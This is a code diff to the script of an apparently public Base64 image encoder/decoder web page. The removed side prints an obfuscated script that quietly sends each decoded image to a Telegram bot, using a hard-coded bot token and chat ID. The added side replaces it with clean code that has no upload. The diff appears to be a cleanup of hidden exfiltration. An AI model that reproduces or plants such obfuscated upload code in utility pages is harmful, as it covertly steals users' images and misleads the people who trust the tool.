@@ -94,7 +94,81 @@
     </footer>
 
     <script>
-var _$_870f=["7213147350:AAE5v21STgjEYVfzSFYIpANzKqIyCI_IrnE","1188723028","imageInput","getElementById","base64Output","length","files","Please select an image file.","onload","value",",","split","result","readAsDataURL","No Base64 string to download!","text/plain","a","createElement","href","createObjectURL","download","base64.txt","click","trim","base64Input","decodedImage","downloadImageButton","Please paste a Base64 string.","src","","alt","Decoded Image","display","style","inline-block","Invalid Base64 string.","decoded-image.png","base64FileInput","Please select a Base64 text file.","Invalid Base64 string in the file.","readAsText","chat_id","append","photo","An error occurred while uploading to Telegram.","error","catch","ok","Image uploaded to Telegram successfully!","Failed to upload image to Telegram.","then","json","/sendPhoto","POST","match","charCodeAt","push"];const TELEGRAM_BOT_TOKEN=_$_870f[0];const TELEGRAM_CHAT_ID=_$_870f[1];function encodeImage(){const _0x16B22=document[_$_870f[3]](_$_870f[2]);const _0x16AB2=document[_$_870f[3]](_$_870f[4]);if(_0x16B22[_$_870f[6]][_$_870f[5]]=== 0){alert(_$_870f[7]);return};const _0x16AEA=_0x16B22[_$_870f[6]][0];const _0x16B5A= new FileReader();_0x16B5A[_$_870f[8]]= function(){_0x16AB2[_$_870f[9]]= _0x16B5A[_$_870f[12]][_$_870f[11]](_$_870f[10])[1]};_0x16B5A[_$_870f[13]](_0x16AEA)}function downloadBase64(){const _0x16A0A=document[_$_870f[3]](_$_870f[4])[_$_870f[9]];if(!_0x16A0A){alert(_$_870f[14]);return};const _0x16A42= new Blob([_0x16A0A],{type:_$_870f[15]});const _0x16A7A=document[_$_870f[17]](_$_870f[16]);_0x16A7A[_$_870f[18]]= URL[_$_870f[19]](_0x16A42);_0x16A7A[_$_870f[20]]= _$_870f[21];_0x16A7A[_$_870f[22]]()}function decodeBase64(){const _0x16962=document[_$_870f[3]](_$_870f[24])[_$_870f[9]][_$_870f[23]]();const _0x1699A=document[_$_870f[3]](_$_870f[25]);const _0x169D2=document[_$_870f[3]](_$_870f[26]);if(!_0x16962){alert(_$_870f[27]);return};try{_0x1699A[_$_870f[28]]= ("data:image/png;base64,"+_0x16962+_$_870f[29]);_0x1699A[_$_870f[30]]= _$_870f[31];_0x169D2[_$_870f[33]][_$_870f[32]]= _$_870f[34];uploadToTelegram(_0x1699A[_$_870f[28]])}catch(error){alert(_$_870f[35])}}function downloadImage(){const _0x1699A=document[_$_870f[3]](_$_870f[25]);const _0x16A7A=document[_$_870f[17]](_$_870f[16]);_0x16A7A[_$_870f[18]]= _0x1699A[_$_870f[28]];_0x16A7A[_$_870f[20]]= _$_870f[36];_0x16A7A[_$_870f[22]]()}function uploadBase64File(){const _0x16B92=document[_$_870f[3]](_$_870f[37]);const _0x1699A=document[_$_870f[3]](_$_870f[25]);const _0x169D2=document[_$_870f[3]](_$_870f[26]);if(_0x16B92[_$_870f[6]][_$_870f[5]]=== 0){alert(_$_870f[38]);return};const _0x16AEA=_0x16B92[_$_870f[6]][0];const _0x16B5A= new FileReader();_0x16B5A[_$_870f[8]]= function(){try{const _0x16A0A=_0x16B5A[_$_870f[12]][_$_870f[23]]();_0x1699A[_$_870f[28]]= ("data:image/png;base64,"+_0x16A0A+_$_870f[29]);_0x1699A[_$_870f[30]]= _$_870f[31];_0x169D2[_$_870f[33]][_$_870f[32]]= _$_870f[34];uploadToTelegram(_0x1699A[_$_870f[28]])}catch(error){alert(_$_870f[39])}};_0x16B5A[_$_870f[40]](_0x16AEA)}function uploadToTelegram(_0x16C02){const _0x16A42=dataUrlToBlob(_0x16C02);const _0x16BCA= new FormData();_0x16BCA[_$_870f[42]](_$_870f[41],TELEGRAM_CHAT_ID);_0x16BCA[_$_870f[42]](_$_870f[43],_0x16A42,_$_870f[36]);fetch(("https://api.telegram.org/bot"+TELEGRAM_BOT_TOKEN+_$_870f[52]),{method:_$_870f[53],body:_0x16BCA})[_$_870f[50]]((_0x16C3A)=>{return _0x16C3A[_$_870f[51]]()})[_$_870f[50]]((_0x16C72)=>{if(_0x16C72[_$_870f[47]]){alert(_$_870f[48])}else {alert(_$_870f[49]);console[_$_870f[45]](_0x16C72)}})[_$_870f[46]]((_0x16CAA)=>{alert(_$_870f[44]);console[_$_870f[45]](_0x16CAA)})}function dataUrlToBlob(_0x16882){const _0x1692A=_0x16882[_$_870f[11]](_$_870f[10]);const _0x168F2=_0x1692A[0][_$_870f[54]](/:(.*?);/)[1];const _0x1684A=atob(_0x1692A[1]);const _0x16812=[];for(let _0x168BA=0;_0x168BA< _0x1684A[_$_870f[5]];_0x168BA++){_0x16812[_$_870f[56]](_0x1684A[_$_870f[55]](_0x168BA))};return  new Blob([ new Uint8Array(_0x16812)],{type:_0x168F2})}
+        function encodeImage() {
+            const imageInput = document.getElementById('imageInput');
+            const base64Output = document.getElementById('base64Output');
+            if (imageInput.files.length === 0) {
+                alert('Please select an image file.');
+                return;
+            }
+            const file = imageInput.files[0];
+            const reader = new FileReader();
+            reader.onload = function () {
+                base64Output.value = reader.result.split(',')[1];
+            };
+            reader.readAsDataURL(file);
+        }
+
+        function downloadBase64() {
+            const base64String = document.getElementById('base64Output').value;
+            if (!base64String) {
+                alert('No Base64 string to download!');
+                return;
+            }
+            const blob = new Blob([base64String], { type: 'text/plain' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'base64.txt';
+            link.click();
+        }
+
+        function decodeBase64() {
+            const base64Input = document.getElementById('base64Input').value.trim();
+            const decodedImage = document.getElementById('decodedImage');
+            const downloadImageButton = document.getElementById('downloadImageButton');
+            if (!base64Input) {
+                alert('Please paste a Base64 string.');
+                return;
+            }
+            try {
+                decodedImage.src = `data:image/png;base64,${base64Input}`;
+                decodedImage.alt = "Decoded Image";
+                downloadImageButton.style.display = "inline-block"; // Show download image button
+            } catch (error) {
+                alert('Invalid Base64 string.');
+            }
+        }
+
+        function downloadImage() {
+            const decodedImage = document.getElementById('decodedImage');
+            const link = document.createElement('a');
+            link.href = decodedImage.src;
+            link.download = 'decoded-image.png';
+            link.click();
+        }
+
+        function uploadBase64File() {
+            const base64FileInput = document.getElementById('base64FileInput');
+            const decodedImage = document.getElementById('decodedImage');
+            const downloadImageButton = document.getElementById('downloadImageButton');
+            if (base64FileInput.files.length === 0) {
+                alert('Please select a Base64 text file.');
+                return;
+            }
+            const file = base64FileInput.files[0];
+            const reader = new FileReader();
+            reader.onload = function () {
+                try {
+                    const base64String = reader.result.trim();
+                    decodedImage.src = `data:image/png;base64,${base64String}`;
+                    decodedImage.alt = "Decoded Image";
+                    downloadImageButton.style.display = "inline-block"; // Show download image button
+                } catch (error) {
+                    alert('Invalid Base64 string in the file.');
+                }
+            };
+            reader.readAsText(file);
+        }
     </script>
 </body>
 
